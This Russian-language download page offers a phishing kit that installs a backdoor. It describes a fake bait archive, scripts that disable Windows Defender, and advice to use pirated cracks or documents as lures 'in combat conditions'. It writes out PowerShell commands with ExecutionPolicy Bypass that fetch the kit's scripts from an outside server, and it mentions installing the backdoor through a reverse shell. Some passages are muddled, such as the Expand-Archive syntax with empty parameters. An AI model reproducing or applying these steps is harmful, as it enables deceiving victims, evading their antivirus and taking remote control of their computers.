Загрузка файлов

Внимание!!! Антивирусы могут определять этот набор файлов как содержащие вирус. Запускайте скрипты при отключённом антивирусе или добавьте исключения антивируса. Для добавления исключений антивируса можно использовать ссылку на первый скачиваемый архив.

Внимание! Здесь приведены только скрипты загрузки архивов. Для их распаковки и запуска скриптов может потребоваться графическая оболочка.

 

На данной странице находится пример архива с фейковой «приманкой», содержащий установку бэкдора для установки админ-пака «Экспонета» методом фишинга. Загрузить архив можно по ссылкам ниже. После загрузки файл распаковывается, и запускается командный файл, обрабатывающий запароленный самораспаковывающийся архив. После распаковки и установки бэкдора к компьютеру возможно применение троянцев удалённого доступа и других троянцев, распространяемых в том числе с помощью документов Microsoft Word с макросами.

В качестве тестовой приманки используется текстовый файл, запускаемый в редакторе notepad. В боевых условиях настоятельно рекомендуется вместо этого использовать «полезные» файлы в виде документации, презентаций, кряков программ, рисунков, видео, слайд-шоу и т.п.

 

На этой странице предлагается загрузка следующих файлов:

  • DefenderScripts.zip — Набор скриптов для управления антивирусом Microsoft Windows Defender и предотвращения его ложного срабатывания при установки бэкдора.
  • Dn.KMS.scripts.wsf — Скрипт для полуатоматической загрузки скриптов для скачивания архива выше (смотри файл Загрузки KMS активатора.).
  • mainexample.zip — Архив, содержащий самораспаковывающийся архив со скриптами бэкдора (запароленнывй на всякий случай), собственно текст-приманку и программу для распаковки архива и запуска приманки и установленного бэкдора. Архив без пароля!.
  • nit-silentinstall.mainexample.scripts.download.cmd — Скрипт для полуатоматической загрузки второго архива (смотри файл markdown).

Файлы реализуют различные функции на удалённом компьютере.

После загрузки файлов распакуйте архив, и выполните действия, описанные в инструкции.

Примечание. Для загрузки скрипта .cmd можно использовать следующий код powershell:

powershell.exe -NoProfile -WindowStyle Normal -ExecutionPolicy Bypass -Command "((new-object System.Net.WebClient).DownloadFile('http://distrib.netip6.ru/NIT/NIT-SilentInstalls/MainExample/nit-silentinstall.mainexample.scripts.download.cmd', '$env:USERPROFILE\nit-silentinstall.mainexample.scripts.download.cmd'))"

Примечание. Для загрузки скрипта .WSF можно использовать следующий код powershell:

powershell.exe -NoProfile -WindowStyle Normal -ExecutionPolicy Bypass -Command "((new-object System.Net.WebClient).DownloadFile('http://distrib.netip6.ru/NIT/KMS/Dn.KMS.scripts.wsf', '$env:USERPROFILE\Dn.KMS.scripts.wsf'))"

Распаковка архива в командной строке

Для распаковки указанных архивов в командной строке PowerShell 5.1+ можно использовать командлет Expand-Archive:

Expand-Archive
      [-Path] 
      [[-DestinationPath] ]
      [-Force]
      [-PassThru]
      [-WhatIf]
      [-Confirm]
      []

или

Expand-Archive
      -LiteralPath 
      [[-DestinationPath] ]
      [-Force]
      [-PassThru]
      [-WhatIf]
      [-Confirm]
      []

где строка -Path или -LiteralPath определяет полный путь к распаковываему архиву, а необязательный строковый параметр -DestinationPath задаёт каталог, в который распаковывается архив. Таким образом можно запустить установку бэкдора из-под реверс-шелл.
